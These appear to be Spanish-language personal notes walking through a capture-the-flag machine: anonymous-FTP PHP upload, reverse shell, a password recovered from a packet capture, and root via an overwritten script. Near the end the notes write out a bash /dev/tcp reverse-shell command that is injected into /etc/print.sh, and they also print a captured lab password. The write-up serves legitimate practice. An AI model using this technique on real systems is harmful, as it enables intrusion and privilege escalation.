Hacemos el reconocimiento con nmap:
![[Mis apuntes/ANEXOS/Pasted image 20230702122506.png]]

Y esta es la página web:
![[Mis apuntes/ANEXOS/Pasted image 20230702122536.png]]

Podemos hacer fuzzing y nos encontramos con el directorio files:
![[Mis apuntes/ANEXOS/Pasted image 20230702122609.png]]

Y aquí tenemos su contenido:
![[Mis apuntes/ANEXOS/Pasted image 20230702122622.png]]

Y en cuanto al servicio FTP está activado el login como anonymous, por tanto vamos a subir un archivo php malicioso:
![[Mis apuntes/ANEXOS/Pasted image 20230702122858.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230702122907.png]]

Y dentro del directorio /ftp nos encontramos con el archivo subido:
![[Mis apuntes/ANEXOS/Pasted image 20230702122931.png]]

Lo ejecutamos y ya tenemos ejecución remota de comandos:
![[Mis apuntes/ANEXOS/Pasted image 20230702122947.png]]

Urlencodeamos el comando para enviarnos una reverse shell:
![[Mis apuntes/ANEXOS/Pasted image 20230702123720.png]]

Lo ejecutamos, nos ponemos en escucha con netcat y ya estamos dentro:
![[Mis apuntes/ANEXOS/Pasted image 20230702123742.png]]
![[Mis apuntes/ANEXOS/Pasted image 20230702123749.png]]

Una vez dentro, podemos visualizar la receta dentro del directorio raiz, la cual es love:
![[Mis apuntes/ANEXOS/Pasted image 20230702124718.png]]

Nos encontramos con un archivo llamado suspicious.pcapng, el cual es posible que contenga algo interesante, por lo que nos lo copiamos dentro del directorio ftp para descargarlo en nuestra máquina atacante y analizarlo:
![[Mis apuntes/ANEXOS/Pasted image 20230702124855.png]]

![[Mis apuntes/ANEXOS/Pasted image 20230702124920.png]]

Vemos que este archivo tiene extensión .pcapng, por tanto es posible que podamos leerlo con wireshark con tcpdump:
![[Mis apuntes/ANEXOS/Pasted image 20230702125116.png]]

Una vez aquí hacemos clic derecho sobre alguno de los paquetes y hacemos clic en Follow stream:
![[Mis apuntes/ANEXOS/sdfgsdfghsdfhdfghdfgh.png]]

Y se nos abre esta ventana donde capturamos unas credenciales:
c4ntg3t3n0ughsp1c3
![[Mis apuntes/ANEXOS/Pasted image 20230702125617.png]]

Probamos estas credenciales con el usuario lennie y vemos que funciona:
![[Mis apuntes/ANEXOS/Pasted image 20230702125657.png]]

Vemos una carpeta llamada scripts donde hay un script, el cual ejecuta un comando como root y llama a otro script llamado print.sh situado en /etc:
![[Mis apuntes/ANEXOS/Pasted image 20230702130004.png]]

Y el contenido de print.sh es este:
![[Mis apuntes/ANEXOS/Pasted image 20230702130026.png]]

Por tanto vamos a modificar el contenido del archivo print.sh y nos enviaremos una reverse shell como root si estamos escuchando con netcat:
![[Mis apuntes/ANEXOS/Pasted image 20230702130934.png]]

Otra alternativa a acceder al fichero y modificarlo es cambiando el contendio del fichero con echo, el comando seria el siguiente:
```Bash
echo "bash -c 'exec bash -i &>/dev/tcp/10.9.0.150/444 <&1'" > /etc/print.sh
```
![[Pasted image 20240531125415.png]]

Una vez ejecutado el comando y teniendo en escucha por otro terminal netcat habremos obtenido la shell como root
![[Pasted image 20240531125520.png]]



